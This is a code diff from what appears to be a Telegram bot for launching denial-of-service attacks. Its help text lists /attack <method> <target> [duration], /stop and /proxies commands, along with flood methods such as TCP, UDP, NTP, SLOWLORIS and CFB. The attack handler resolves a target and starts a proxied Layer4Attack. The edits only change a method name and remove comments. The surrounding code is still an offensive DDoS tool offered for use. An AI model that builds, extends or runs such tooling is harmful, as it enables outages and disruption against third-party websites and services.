@@ -47,7 +47,7 @@ def start(message):
         "  `/attack <method> <target> [duration]` - Start attack\n"
         "  `/stop` - Stop attack\n"
         "  `/proxies` - Check proxies\n"
-        "💡 *Supported Methods*: TCP, UDP, NTP, SLOWLORIS, GET, POST, HTTP3, CFB"
+        "💡 *Supported Methods*: TCP, UDP, NTP, SLOWLORIS, GET, POST, HTTP2, CFB"
     ), parse_mode="Markdown")
 
 @bot.message_handler(commands=['attack'])
@@ -72,11 +72,11 @@ def attack(message):
             if ":" not in target:
                 target += ":80"
             host, port = target.split(":")
-            socket.gethostbyname(host)  # Kiểm tra tên miền hoặc IP
+            socket.gethostbyname(host)
             attack = Layer4Attack(host + ":" + port, method, proxies, config["default_threads"], duration)
 
         attack.event.set()
-        asyncio.run(attack.run())  # Chạy bất đồng bộ
+        asyncio.run(attack.run())
         attacks[message.chat.id] = attack
         bot.reply_to(message, (
             f"✅ *Attack Launched* ✅\n"
